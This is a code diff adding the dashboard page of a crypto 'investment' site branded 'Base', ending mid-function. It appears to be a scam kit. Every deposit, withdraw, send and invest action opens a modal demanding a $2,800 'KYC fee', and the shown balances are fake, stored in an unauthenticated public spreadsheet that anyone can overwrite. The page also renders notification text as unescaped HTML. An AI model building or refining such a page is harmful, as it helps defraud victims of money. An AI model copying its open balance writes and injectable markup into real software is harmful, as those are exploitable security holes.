@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Base | Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+      /* --- Modern UI Dashboard Enhancements --- */
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(120deg, #f8f9fa 60%, #eaf1ff 100%);
+        color: #23272f;
+        margin: 0;
+      }
+      header {
+        background: linear-gradient(135deg, #0052ff, #1652f0);
+        color: #fff;
+        padding: 1.3rem 2rem 1rem 2rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        box-shadow: 0 2px 16px rgba(0,82,255,0.10);
+        border-bottom-left-radius: 18px;
+        border-bottom-right-radius: 18px;
+      }
+      header .logo {
+        font-size: 2rem;
+        font-weight: bold;
+        letter-spacing: -1px;
+        text-decoration: none;
+        color: #fff;
+        display: flex;
+        align-items: center;
+        gap: 0.7rem;
+      }
+      header .logo::before {
+        content: '';
+        display: inline-block;
+        width: 1.6rem;
+        height: 1.6rem;
+        background: linear-gradient(135deg, #0052ff, #00d4ff);
+        border-radius: 7px;
+        margin-right: 0.2rem;
+      }
+      header .dash-user {
+        font-size: 1.1rem;
+        background: #fff;
+        color: #1652f0;
+        padding: 0.3em 0.9em;
+        border-radius: 8px;
+        margin-right: 0.7em;
+        font-weight: 500;
+        box-shadow: 0 2px 8px rgba(0,82,255,0.07);
+      }
+      header .logout-btn {
+        background: linear-gradient(90deg, #1652f0 60%, #00d4ff 100%);
+        color: #fff;
+        border: none;
+        font-weight: 600;
+        padding: 8px 22px;
+        border-radius: 20px;
+        cursor: pointer;
+        transition: .2s;
+        box-shadow: 0 2px 8px rgba(0,82,255,0.08);
+      }
+      header .logout-btn:hover {
+        background: #003fa1;
+        color: #fff;
+      }
+      .container {
+        max-width: 1100px;
+        margin: 36px auto 0 auto;
+        padding: 0 1.2rem 2.5rem 1.2rem;
+        background: #fff;
+        border-radius: 18px;
+        box-shadow: 0 4px 32px rgba(0,82,255,0.07);
+      }
+      .notif-container {margin-bottom:1.3rem;}
+      .notif-bar {
+        background: #f3f7ff;
+        color: #1652f0;
+        border-left: 5px solid #00d4ff;
+        padding: .9em 2em .9em 1em;
+        margin-bottom: .6em;
+        border-radius: 7px;
+        font-size: 1.03em;
+        display: flex; align-items: center; gap:.6em; position:relative;
+        box-shadow:0 2px 12px rgba(0,82,255,0.06);
+        animation: fadeInDown .3s;
+      }
+      .notif-title { font-weight: 600; margin-right: 0.6em;}
+      .notif-time { font-size:.95em; margin-left:.7em; color: #00b3ff;}
+      .notif-close {
+        border: none;
+        background: none;
+        font-size: 1.4em;
+        color: #1652f0;
+        cursor: pointer;
+        position: absolute;
+        right: .6em;
+        top: .25em;
+        transition: color 0.18s;
+      }
+      .notif-close:hover { color: #e11d48; }
+      .tab-bar {
+        display: flex;
+        gap: 1em;
+        margin-bottom: 2em;
+        justify-content: center;
+      }
+      .tab-btn {
+        background: #eef2ff;
+        border: none;
+        padding: .7em 2em;
+        border-radius: 10px;
+        cursor: pointer;
+        font-weight: 600;
+        font-size: 1.07em;
+        color: #1652f0;
+        letter-spacing: 0.01em;
+        transition: background 0.18s, color 0.18s;
+        box-shadow: 0 2px 8px rgba(0,82,255,0.04);
+      }
+      .tab-btn.active {
+        background: linear-gradient(90deg, #1652f0 60%, #00d4ff 100%);
+        color: #fff;
+        box-shadow: 0 4px 16px rgba(0,82,255,0.10);
+      }
+      .dash-cards {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 2em;
+        margin-bottom: 2em;
+        justify-content: center;
+      }
+      .card {
+        background: #fafdff;
+        border-radius: 16px;
+        box-shadow: 0 4px 24px rgba(0,82,255,0.07);
+        flex: 1 1 260px;
+        padding: 2.2rem 2.2rem 1.7rem 2.2rem;
+        min-width: 260px;
+        max-width: 370px;
+        border: 1.5px solid #eaf1ff;
+        transition: box-shadow 0.18s, transform 0.18s;
+      }
+      .card:hover {
+        box-shadow: 0 8px 32px rgba(0,82,255,0.13);
+        transform: translateY(-2px) scale(1.01);
+      }
+      .card h2 {
+        font-size: 1.35em;
+        margin: 0 0 6px;
+      }
+      .balance {
+        font-size: 2.3em;
+        font-weight: 800;
+        background: linear-gradient(90deg, #1652f0 10%, #00d4ff 90%);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        margin-bottom: 0.4em;
+      }
+      .label {
+        color: #666;
+        font-size: 1em;
+        margin-bottom: 0.1em;
+        font-weight: 500;
+      }
+      .actions {
+        margin-top: 1.5em;
+        display: flex;
+        gap: 0.7em;
+      }
+      .actions button, .actions input[type=submit] {
+        background: linear-gradient(90deg, #1652f0 60%, #00d4ff 100%);
+        color: #fff;
+        border: none;
+        font-weight: 600;
+        padding: 10px 23px;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: background 0.16s, transform 0.13s;
+        box-shadow: 0 2px 8px rgba(0,82,255,0.08);
+      }
+      .actions button:hover, .actions input[type=submit]:hover {
+        background: #003fa1;
+        transform: translateY(-1px) scale(1.04);
+      }
+      .crypto-widget {
+        background: #f7faff;
+        border-radius: 12px;
+        padding: 1em 1.5em 1em 1em;
+        margin-bottom: .9em;
+        box-shadow: 0 2px 8px rgba(10,100,255,.03);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .crypto-widget h4 {
+        margin: 0 0 2px;
+        font-weight: 600;
+        color: #1652f0;
+        font-size: 1.1em;
+      }
+      .crypto-price {
+        font-size: 1.2em;
+        font-weight: 600;
+        margin-right: 0.7em;
+      }
+      .crypto-change.negative { color: #e11d48; }
+      .crypto-change.positive { color: #18b200; }
+      .dash-section {
+        margin-bottom: 2.5em;
+      }
+      .section-title {
+        font-size: 1.17em;
+        margin-bottom: 9px;
+        color: #1a283f;
+        font-weight: 700;
+        letter-spacing: 0.01em;
+      }
+      table {
+        border-collapse: collapse;
+        width: 100%;
+        background: #fafdff;
+        border-radius: 10px;
+        overflow: hidden;
+        box-shadow: 0 2px 12px rgba(0,82,255,0.04);
+      }
+      th, td {
+        padding: .7em .4em;
+        border-bottom: 1px solid #f1f1f1;
+        font-size: 1em;
+      }
+      th {
+        text-align: left;
+        color: #1652f0;
+        background: #f3f7ff;
+        font-weight: 600;
+      }
+      tr:last-child td { border-bottom: none; }
+      .settings-form input, .settings-form select {
+        margin-bottom: 1.1em;
+        padding: 0.7em 1em;
+        border-radius: 8px;
+        border: 2px solid #e5e7eb;
+        font-size: 1em;
+        background: #fafbfc;
+        transition: border-color 0.2s;
+      }
+      .settings-form input:focus, .settings-form select:focus {
+        border-color: #1652f0;
+        outline: none;
+      }
+      .settings-form button {
+        width: 100%;
+        margin-top: 0.5em;
+      }
+      #supportForm input, #supportForm textarea {
+        padding: 0.7em 1em;
+        border-radius: 8px;
+        border: 2px solid #e5e7eb;
+        font-size: 1em;
+        background: #fafbfc;
+        margin-bottom: 1em;
+        transition: border-color 0.2s;
+      }
+      #supportForm input:focus, #supportForm textarea:focus {
+        border-color: #1652f0;
+        outline: none;
+      }
+      #supportForm button {
+        width: 100%;
+        margin-top: 0.5em;
+      }
+      .success-msg, .error-msg {
+        font-size: 1em;
+        margin-top: 0.5em;
+        margin-bottom: 0.5em;
+        text-align: center;
+        display: none;
+      }
+      .success-msg { color: #10b981; }
+      .error-msg { color: #e11d48; }
+      .modal {
+        display: none;
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.18);
+        z-index: 1001;
+        align-items: center;
+        justify-content: center;
+      }
+      .modal.active { display: flex; }
+      .modal-content {
+        background: #fff;
+        border-radius: 14px;
+        padding: 2.2rem 1.7rem;
+        max-width: 400px;
+        width: 95%;
+        position: relative;
+        box-shadow: 0 8px 32px rgba(0,82,255,0.13);
+        animation: fadeInUp 0.3s;
+      }
+      @keyframes fadeInUp {
+        from { opacity: 0; transform: translateY(30px);}
+        to { opacity: 1; transform: translateY(0);}
+      }
+      .modal-content h3 {
+        margin-top: 0;
+        color: #1652f0;
+        font-size: 1.3em;
+        font-weight: 700;
+        text-align: center;
+      }
+      .modal-content input, .modal-content select {
+        width: 100%;
+        padding: .7em 1em;
+        margin: 10px 0 20px 0;
+        border-radius: 8px;
+        border: 2px solid #e5e7eb;
+        font-size: 1em;
+        background: #fafbfc;
+        transition: border-color 0.2s;
+      }
+      .modal-content input:focus, .modal-content select:focus {
+        border-color: #1652f0;
+        outline: none;
+      }
+      .modal-content .close-modal {
+        position: absolute;
+        right: 1.1em;
+        top: .8em;
+        background: none;
+        border: none;
+        font-size: 1.3em;
+        color: #aaa;
+        cursor: pointer;
+        transition: color 0.18s;
+      }
+      .modal-content .close-modal:hover { color: #e11d48; }
+      @media (max-width: 900px) {
+        .container { padding: .7em; }
+        .dash-cards { flex-direction: column; gap: 1.2em; }
+        .card { min-width: unset; }
+      }
+      @media (max-width: 600px) {
+        header { flex-direction: column; align-items: flex-start; padding: 1.2rem 1rem 1rem 1rem; }
+        .container { border-radius: 0; box-shadow: none; }
+        .dash-cards { gap: 0.7em; }
+        .card { padding: 1.3rem 1rem 1.1rem 1rem; }
+        .tab-bar { flex-direction: column; gap: 0.5em; }
+      }
+  </style>
+</head>
+<body>
+<header>
+  <a href="#" class="logo">Base</a>
+  <div>
+    <span class="dash-user" id="dashUserName"></span> (<span id="dashUserEmail"></span>)
+    <button class="logout-btn" id="logoutBtn">Log out</button>
+  </div>
+</header>
+<div class="container">
+  <div class="notif-container" id="notifBar"></div>
+  
+  <div class="tab-bar">
+    <button class="tab-btn active" data-tab="dashboard">Dashboard</button>
+    <button class="tab-btn" data-tab="notifications">Notifications</button>
+    <button class="tab-btn" data-tab="settings">Settings</button>
+    <button class="tab-btn" data-tab="support">Support</button>
+  </div>
+
+  <!-- DASHBOARD TAB -->
+  <div id="tab-dashboard" class="tab-section">
+    <div class="dash-cards">
+      <div class="card">
+        <div class="label">Portfolio Value</div>
+        <div class="balance" id="dashBalance">$0.00</div>
+        <div class="actions">
+          <button onclick="openModal('deposit')"><span style="font-size:1.2em;">&#43;</span> Deposit</button>
+          <button onclick="openModal('withdraw')"><span style="font-size:1.2em;">&#8595;</span> Withdraw</button>
+          <button onclick="openModal('send')"><span style="font-size:1.2em;">&#10148;</span> Send</button>
+          <button onclick="openModal('invest')" style="background:linear-gradient(90deg,#00d4ff 60%,#1652f0 100%);"><span style="font-size:1.2em;">&#128200;</span> Invest</button>
+        </div>
+      </div>
+      <div class="card" style="max-width:440px;">
+        <div class="section-title">Crypto Prices</div>
+        <div id="cryptoWidgets">
+          <div class="crypto-widget"><h4>BTC/USD</h4><span class="crypto-price" id="btcPrice">--</span> <span id="btcChange" class="crypto-change"></span></div>
+          <div class="crypto-widget"><h4>ETH/USD</h4><span class="crypto-price" id="ethPrice">--</span> <span id="ethChange" class="crypto-change"></span></div>
+          <div class="crypto-widget"><h4>SOL/USD</h4><span class="crypto-price" id="solPrice">--</span> <span id="solChange" class="crypto-change"></span></div>
+          <div class="crypto-widget"><h4>USDT/USD</h4><span class="crypto-price" id="usdtPrice">--</span> <span id="usdtChange" class="crypto-change"></span></div>
+        </div>
+      </div>
+    </div>
+    <div class="dash-section">
+      <div class="section-title">Recent Transactions</div>
+      <table id="transactionsTable">
+        <thead><tr><th>Date</th><th>Description</th><th>Amount</th></tr></thead>
+        <tbody id="transactionsBody"><tr><td colspan="3" style="color:#888;">No recent transactions.</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- NOTIFICATIONS TAB -->
+  <div id="tab-notifications" class="tab-section" style="display:none;">
+    <div id="notificationsList"></div>
+  </div>
+
+  <!-- SETTINGS TAB -->
+  <div id="tab-settings" class="tab-section" style="display:none;">
+    <div class="section-title">Update Account Settings</div>
+    <form id="settingsForm" class="settings-form">
+      <label>Full Name</label>
+      <input type="text" id="settingsName" required>
+      <label>Email</label>
+      <input type="email" id="settingsEmail" required>
+      <button type="submit" class="btn-primary">Update</button>
+      <div class="success-msg" id="settingsSuccess" style="display:none;"></div>
+      <div class="error-msg" id="settingsFail" style="display:none;"></div>
+    </form>
+  </div>
+
+  <!-- SUPPORT TAB -->
+  <div id="tab-support" class="tab-section" style="display:none;">
+    <div class="section-title">Contact Support</div>
+    <form id="supportForm">
+      <label>Your Email</label>
+      <input type="email" id="supportEmail" required>
+      <label>Subject</label>
+      <input type="text" id="supportSubject" required>
+      <label>Message</label>
+      <textarea id="supportMessage" required style="width:100%;height:90px;border-radius:7px;padding:8px;border:1px solid #ccc;font-size:1em;margin-bottom:1em;"></textarea>
+      <button type="submit" class="btn-primary">Send Ticket</button>
+      <div class="success-msg" id="supportSuccess" style="display:none;"></div>
+      <div class="error-msg" id="supportFail" style="display:none;"></div>
+    </form>
+  </div>
+
+  <!-- DEPOSIT MODAL -->
+  <div class="modal" id="depositModal">
+    <div class="modal-content">
+      <button class="close-modal" onclick="closeModal('deposit')">&times;</button>
+      <h3>Deposit</h3>
+      <form id="depositForm">
+        <label>Amount (USD)</label>
+        <input type="number" id="depositAmount" min="1" required>
+        <button type="submit" class="btn-primary">Deposit</button>
+        <div class="success-msg" id="depositSuccess" style="display:none;"></div>
+        <div class="error-msg" id="depositFail" style="display:none;"></div>
+      </form>
+    </div>
+  </div>
+  <!-- WITHDRAW MODAL -->
+  <div class="modal" id="withdrawModal">
+    <div class="modal-content">
+      <button class="close-modal" onclick="closeModal('withdraw')">&times;</button>
+      <h3>Withdraw</h3>
+      <form id="withdrawForm">
+        <label>Amount (USD)</label>
+        <input type="number" id="withdrawAmount" min="1" required>
+        <button type="submit" class="btn-primary">Withdraw</button>
+        <div class="success-msg" id="withdrawSuccess" style="display:none;"></div>
+        <div class="error-msg" id="withdrawFail" style="display:none;"></div>
+      </form>
+    </div>
+  </div>
+  <!-- SEND MODAL -->
+  <div class="modal" id="sendModal">
+    <div class="modal-content">
+      <button class="close-modal" onclick="closeModal('send')">&times;</button>
+      <h3>Send Funds</h3>
+      <form id="sendForm">
+        <label>Recipient Email</label>
+        <input type="email" id="sendRecipient" required>
+        <label>Amount (USD)</label>
+        <input type="number" id="sendAmount" min="1" required>
+        <button type="submit" class="btn-primary">Send</button>
+        <div class="success-msg" id="sendSuccess" style="display:none;"></div>
+        <div class="error-msg" id="sendFail" style="display:none;"></div>
+      </form>
+    </div>
+  </div>
+  <!-- INVEST MODAL -->
+  <div class="modal" id="investModal">
+    <div class="modal-content">
+      <button class="close-modal" onclick="closeModal('invest')">&times;</button>
+      <h3>Invest in Crypto</h3>
+      <form id="investForm">
+        <label for="investAsset">Select Asset</label>
+        <select id="investAsset" required>
+          <option value="">Choose...</option>
+          <option value="BTC">Bitcoin (BTC)</option>
+          <option value="ETH">Ethereum (ETH)</option>
+          <option value="SOL">Solana (SOL)</option>
+          <option value="USDT">Tether (USDT)</option>
+        </select>
+        <label for="investAmount">Amount (USD)</label>
+        <input type="number" id="investAmount" min="10" step="0.01" required placeholder="Minimum $10">
+        <label for="investDuration">Investment Duration</label>
+        <select id="investDuration" required>
+          <option value="">Choose...</option>
+          <option value="7">7 days (Short-term)</option>
+          <option value="30">30 days (1 month)</option>
+          <option value="90">90 days (3 months)</option>
+        </select>
+        <label for="investRisk">Risk Level</label>
+        <select id="investRisk" required>
+          <option value="">Choose...</option>
+          <option value="low">Low (Stable)</option>
+          <option value="medium">Medium</option>
+          <option value="high">High (Aggressive)</option>
+        </select>
+        <button type="submit" class="btn-primary">Invest</button>
+        <div class="success-msg" id="investSuccess" style="display:none;"></div>
+        <div class="error-msg" id="investFail" style="display:none;"></div>
+      </form>
+    </div>
+  </div>
+  <!-- KYC REQUIRED MODAL -->
+  <div class="modal" id="kycModal">
+    <div class="modal-content" style="max-width: 410px; text-align: center;">
+      <button class="close-modal" onclick="closeModal('kyc')">&times;</button>
+      <img src="https://img.icons8.com/ios-filled/100/0052ff/identity-theft.png" alt="KYC Required" style="width:64px;height:64px;margin-bottom:1rem;">
+      <h3 style="color:#e11d48;margin-bottom:0.7em;">Account Activation Required</h3>
+      <p style="font-size:1.08em; color:#23272f; margin-bottom:1.2em;">
+        To access this feature, please activate your account by completing KYC verification.<br>
+        <span style="color:#1652f0;font-weight:600;">A one-time KYC fee of <span style="color:#e11d48;">$2,800</span> is required.</span>
+      </p>
+      <div style="background:#f3f7ff;border-radius:8px;padding:1em 0.7em;margin-bottom:1.2em;">
+        <span style="color:#0052ff;font-weight:500;">Need help?</span><br>
+        Contact our Customer Center:<br>
+        <a href="mailto:support@basecrypto.help" style="color:#1652f0;font-weight:600;text-decoration:underline;">info@basecrypto.help</a>
+      </div>
+      <button class="btn-primary" onclick="closeModal('kyc')" style="width:100%;margin-top:0.5em;">OK</button>
+    </div>
+  </div>
+</div>
+<script>
+// ------------------ CONSTANTS -----------------
+const SHEETDB_API = "https://sheetdb.io/api/v1/sbath1xpp3h1u";
+const NOTIF_API = "https://sheetdb.io/api/v1/sbath1xpp3h1u/t/notifications";
+let userEmail = localStorage.getItem("user_email");
+let userName = localStorage.getItem("user_name");
+
+// ------------------ LOGOUT --------------------
+document.getElementById("logoutBtn").onclick = function() {
+  localStorage.removeItem("user_email");
+  localStorage.removeItem("user_name");
+  window.location.href = "index.html";
+};
+
+// ----------------- TAB SWITCH -----------------
+const tabBtns = document.querySelectorAll('.tab-btn');
+const tabSections = document.querySelectorAll('.tab-section');
+tabBtns.forEach(btn=>{
+  btn.onclick = function(){
+    tabBtns.forEach(b=>b.classList.remove('active'));
+    tabSections.forEach(s=>s.style.display="none");
+    this.classList.add('active');
+    document.getElementById('tab-'+this.dataset.tab).style.display="block";
+    if(this.dataset.tab==="notifications") fetchNotifications(true);
+    if(this.dataset.tab==="settings") loadSettings();
+  }
+});
+// Dashboard tab default
+document.getElementById('tab-dashboard').style.display = "block";
+
+// ----------------- DASHBOARD LOAD -----------------
+let currentBalance = 0.00;
+function loadDashboard() {
+  if(!userEmail){ window.location.href = "index.html"; return; }
+  document.getElementById('dashUserEmail').textContent = userEmail;
+  document.getElementById('dashUserName').textContent = userName || "";
+  fetch(`${SHEETDB_API}/search?email=${encodeURIComponent(userEmail)}`)
+    .then(res=>res.json())
+    .then(data=>{
+      if(data && data.length){
+        userName = data[0].fullname; document.getElementById('dashUserName').textContent = userName;
+        currentBalance = parseFloat(data[0].balance || "0");
+        document.getElementById('dashBalance').textContent = `$${currentBalance.toLocaleString(undefined,{minimumFractionDigits:2})}`;
+        loadTransactions();
+      }
+    });
+}
+function loadTransactions() {
+  // Optional: You can fetch/store user's recent transactions in another SheetDB table for audit trail.
+  // For demo, just show deposit/withdraw/send updates. Could expand this with another API for real logging.
+  let html = '';
+  if(window.recentTx && window.recentTx.length){
+    for(let t of window.recentTx.slice(-7).reverse()){
+      html += `<tr><td>${t.date}</td><td>${t.type}</td><td>${t.amount}</td></tr>`;
+    }
+  } else {
+    html = '<tr><td colspan="3" style="color:#888;">No recent transactions.</td></tr>';
+  }
+  document.getElementById('transactionsBody').innerHTML = html;
+}
+window.recentTx = [];
+
+// ----------------- DEPOSIT -----------------
+function openModal(type) {
+  if (['deposit', 'withdraw', 'send', 'invest'].includes(type)) {
+    document.getElementById('kycModal').classList.add('active');
+    return;
+  }
+  document.getElementById(type + "Modal").classList.add("active");
+}
+function closeModal(type) {
+  if (type === 'kyc') {
+    document.getElementById('kycModal').classList.remove('active');
+    return;
+  }
+  document.getElementById(type + "Modal").classList.remove("active");
+  const form = document.getElementById(type + "Form");
+  if (form) form.reset();
+  const success = document.getElementById(type + "Success");
+  const fail = document.getElementById(type + "Fail");
+  if (success) success.style.display = "none";
+  if (fail) fail.style.display = "none";
+}
+// Deposit
+document.getElementById("depositForm").onsubmit = function(e){
+  e.preventDefault();
+  let amt = parseFloat(document.getElementById('depositAmount').value);
+  if(isNaN(amt)||amt<=0){showMsg('depositFail','Invalid amount');return;}
+  let newBal = currentBalance + amt;
+  document.getElementById('depositSuccess').textContent = "Processing...";
+  document.getElementById('depositSuccess').style.display = "block";
+  fetch(`${SHEETDB_API}/email/${encodeURIComponent(userEmail)}`, {
+    method: "PATCH",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({ data: { balance: newBal.toString() } })
+  }).then(r=>r.json()).then(r=>{
+    if(r.updated===1){
+      window.recentTx = window.recentTx||[];
+      window.recentTx.push({date:new Date().toLocaleString(),type:"Deposit",amount:`+$${amt.toFixed(2)}`});
+      currentBalance = newBal;
+      document.getElementById('dashBalance').textContent = `$${currentBalance.toLocaleString(undefined,{minimumFractionDigits:2})}`;
+      loadTransactions();
+      showMsg('depositSuccess',`$${amt.toFixed(2)} deposited!`);
+      setTimeout(()=>closeModal('deposit'),1200);
+    }else{
+      showMsg('depositFail',"Deposit failed, try again");
+    }
+  }).catch(()=>{showMsg('depositFail',"Deposit failed");});
+};
+// Withdraw
+document.getElementById("withdrawForm").onsubmit = function(e){
+  e.preventDefault();
+  let amt = parseFloat(document.getElementById('withdrawAmount').value);
+  if(isNaN(amt)||amt<=0||amt>currentBalance){showMsg('withdrawFail','Invalid or insufficient balance');return;}
+  let newBal = currentBalance - amt;
+  document.getElementById('withdrawSuccess').textContent = "Processing...";
+  document.getElementById('withdrawSuccess').style.display = "block";
+  fetch(`${SHEETDB_API}/email/${encodeURIComponent(userEmail)}`, {
+    method: "PATCH",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({ data: { balance: newBal.toString() } })
+  }).then(r=>r.json()).then(r=>{
+    if(r.updated===1){
+      window.recentTx = window.recentTx||[];
+      window.recentTx.push({date:new Date().toLocaleString(),type:"Withdraw",amount:`-$${amt.toFixed(2)}`});
+      currentBalance = newBal;
+      document.getElementById('dashBalance').textContent = `$${currentBalance.toLocaleString(undefined,{minimumFractionDigits:2})}`;
+      loadTransactions();
+      showMsg('withdrawSuccess',`$${amt.toFixed(2)} withdrawn!`);
+      setTimeout(()=>closeModal('withdraw'),1200);
+    }else{
+      showMsg('withdrawFail',"Withdraw failed, try again");
+    }
+  }).catch(()=>{showMsg('withdrawFail',"Withdraw failed");});
+};
+// Send
+document.getElementById("sendForm").onsubmit = function(e){
+  e.preventDefault();
+  let recipient = document.getElementById('sendRecipient').value.trim();
+  let amt = parseFloat(document.getElementById('sendAmount').value);
+  if(!recipient||isNaN(amt)||amt<=0||amt>currentBalance){showMsg('sendFail','Invalid details or insufficient balance');return;}
+  // 1. Deduct from user
+  let newBal = currentBalance - amt;
+  document.getElementById('sendSuccess').textContent = "Processing...";
+  document.getElementById('sendSuccess').style.display = "block";
+  fetch(`${SHEETDB_API}/email/${encodeURIComponent(userEmail)}`, {
+    method: "PATCH",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({ data: { balance: newBal.toString() } })
+  }).then(r=>r.json()).then(r=>{
+    if(r.updated===1){
+      // 2. Add to recipient
+      fetch(`${SHEETDB_API}/search?email=${encodeURIComponent(recipient)}`).then(res=>res.json()).then(data=>{
+        if(data.length>0){
+          let rBal = parseFloat(data[0].balance||"0")+amt;
+          fetch(`${SHEETDB_API}/email/${encodeURIComponent(recipient)}`,{
+            method:"PATCH",headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({data:{balance:rBal.toString()}})
+          });
+        }
+      });
+      window.recentTx = window.recentTx||[];
+      window.recentTx.push({date:new Date().toLocaleString(),type:"Send",amount:`-$${amt.toFixed(2)}`});
+      currentBalance = newBal;
+      document.getElementById('dashBalance').textContent = `$${currentBalance.toLocaleString(undefined,{minimumFractionDigits:2})}`;
+      loadTransactions();
+      showMsg('sendSuccess',`$${amt.toFixed(2)} sent!`);
+      setTimeout(()=>closeModal('send'),1200);
+    }else{
+      showMsg('sendFail',"Send failed, try again");
+    }
+  }).catch(()=>{showMsg('sendFail',"Send failed");});
+};
+// Investment form handler
+document.getElementById("investForm").onsubmit = function(e) {
+  e.preventDefault();
+  let asset = document.getElementById("investAsset").value;
+  let amount = parseFloat(document.getElementById("investAmount").value);
+  let duration = document.getElementById("investDuration").value;
+  let risk = document.getElementById("investRisk").value;
+  let failMsg = document.getElementById("investFail");
+  let successMsg = document.getElementById("investSuccess");
+  failMsg.style.display = "none"; successMsg.style.display = "none";
+
+  if (!asset || !amount || amount < 10 || !duration || !risk) {
+    failMsg.textContent = "Please fill all fields and invest at least $10.";
+    failMsg.style.display = "block";
+    return;
+  }
+  if (amount > currentBalance) {
+    failMsg.textContent = "Insufficient balance for this investment.";
+    failMsg.style.display = "block";
+    return;
+  }
+
+  // Simulate investment (deduct balance, add to transactions)
+  let newBal = currentBalance - amount;
+  successMsg.textContent = "Processing investment...";
+  successMsg.style.display = "block";
+  fetch(`${SHEETDB_API}/email/${encodeURIComponent(userEmail)}`, {
+    method: "PATCH",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ data: { balance: newBal.toString() } })
+  }).then(r => r.json()).then(r => {
+    if (r.updated === 1) {
+      window.recentTx = window.recentTx || [];
+      window.recentTx.push({
+        date: new Date().toLocaleString(),
+        type: `Invested in ${asset} (${duration}d, ${risk})`,
+        amount: `-$${amount.toFixed(2)}`
+      });
+      currentBalance = newBal;
+      document.getElementById('dashBalance').textContent = `$${currentBalance.toLocaleString(undefined,{minimumFractionDigits:2})}`;
+      loadTransactions();
+      successMsg.textContent = `Invested $${amount.toFixed(2)} in ${asset}!`;
+      setTimeout(() => closeModal('invest'), 1400);
+    } else {
+      failMsg.textContent = "Investment failed, try again.";
+      failMsg.style.display = "block";
+    }
+  }).catch(() => {
+    failMsg.textContent = "Investment failed, try again.";
+    failMsg.style.display = "block";
+  });
+};
+
+function showMsg(id, msg) {
+  let el = document.getElementById(id);
+  el.textContent = msg; el.style.display = "block";
+  setTimeout(()=>{ el.style.display = "none"; }, 2500);
+}
+
+// ------------------- NOTIFICATIONS ----------------------
+function fetchNotifications(listOnly) {
+  // System-wide and user-specific notifications
+  let url = `${NOTIF_API}?or=(user_email=${encodeURIComponent(userEmail)},user_email=all)`;
+  fetch(url)
+    .then(res => res.json())
+    .then(notifs => {
+      // For bar (top): show only the latest one or all (up to you)
+      if (!listOnly) {
+        if (!notifs.length) {
+          document.getElementById('notifBar').style.display = "none";
+          document.getElementById('notifBar').innerHTML = "";
+          return;
+        }
+        let html = '';
+        for (const note of notifs) {
+          html += `<div class="notif-bar">
+            <span class="notif-title">${note.title || 'Notice'}:</span>
+            <span>${note.message || ''}</span>
+            <span class="notif-time">${note.time || ''}</span>
+            <button class="notif-close" onclick="this.parentNode.style.display='none';">&times;</button>
+          </div>`;
+        }
+        document.getElementById('notifBar').style.display = "block";
+        document.getElementById('notifBar').innerHTML = html;
+      } else {
+        // For notifications tab (full list)
+        let html = '';
+        if (!notifs.length) html = `<div style="color:#888;">No notifications found.</div>`;
+        for (const note of notifs) {
+          html += `<div class="notif-bar" style="border-left:4px solid #1652f0;">
+            <span class="notif-title">${note.title || 'Notice'}:</span>
+            <span>${note.message || ''}</span>
+            <span class="notif-time">${note.time || ''}</span>
+            <button class="notif-close" onclick="this.parentNode.style.display='none';">&times;</button>
+          </div>`;
+        }
+        document.getElementById('notificationsList').innerHTML = html;
+      }
+    })
+    .catch(() => {
+      if (!listOnly) {
+        document.getElementById('notifBar').style.display = "none";
+        document.getElementById('notifBar').innerHTML = "";
+      } else {
+        document.getElementById('notificationsList').innerHTML = `<div style="color:#888;">No notifications found.</div>`;
+      }
+    });
+}
+fetchNotifications(false);
+setInterval(fetchNotifications, 60 * 1000);
+
+// ------------------- LIVE CRYPTO PRICES ---------------------
+function loadPrices() {
+  fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,tether&vs_currencies=usd&include_24hr_change=true")
+  .then(r=>r.json()).then(data=>{
+    // BTC
+    document.getElementById('btcPrice').textContent = `$${parseFloat(data.bitcoin.usd).toLocaleString(undefined,{minimumFractionDigits:2})}`;
+    document.getElementById('btcChange').textContent = `(${data.bitcoin.usd_24h_change > 0 ? '+' : ''}${data.bitcoin.usd_24h_change.toFixed(2)}%)`;
+    document.getElementById('btcChange').className = 'crypto-change ' + (data.bitcoin.usd_24h_change<0?'negative':'positive');
+    // ETH
+    document.getElementById('ethPrice').textContent = `$${parseFloat(data.ethereum.usd).toLocaleString(undefined,{minimumFractionDigits:2})}`;
+    document.getElementById('ethChange').textContent = `(${data.ethereum.usd_24h_change > 0 ? '+' : ''}${data.ethereum.usd_24h_change.toFixed(2)}%)`;
+    document.getElementById('ethChange').className = 'crypto-change ' + (data.ethereum.usd_24h_change<0?'negative':'positive');
+    // SOL
+    document.getElementById('solPrice').textContent = `$${parseFloat(data.solana.usd).toLocaleString(undefined,{minimumFractionDigits:2})}`;
+    document.getElementById('solChange').textContent = `(${data.solana.usd_24h_change > 0 ? '+' : ''}${data.solana.usd_24h_change.toFixed(2)}%)`;
+    document.getElementById('solChange').className = 'crypto-change ' + (data.solana.usd_24h_change<0?'negative':'positive');
+    // USDT
+    document.getElementById('usdtPrice').textContent = `$${parseFloat(data.tether.usd).toLocaleString(undefined,{minimumFractionDigits:2})}`;
+    document.getElementById('usdtChange').textContent = `(${data.tether.usd_24h_change > 0 ? '+' : ''}${data.tether.usd_24h_change.toFixed(2)}%)`;
+    document.getElementById('usdtChange').className = 'crypto-change ' + (data.tether.usd_24h_change<0?'negative':'positive');
+  });
+}
+loadPrices();
+setInterval(loadPrices, 35*1000);
+
+// ------------------- SETTINGS UPDATE ----------------------
+function loadSettings(){
+  document.getElementById("settingsName").value = userName || "";
+  document.getElementById("settingsEmail").value = userEmail || "";
+  document.getElementById('settingsSuccess').style.display = "none";
+  document.getElementById('settingsFail').style.display = "none";
+}
+document.getElementById('settingsForm').onsubmit = function(e){
+  e.preventDefault();
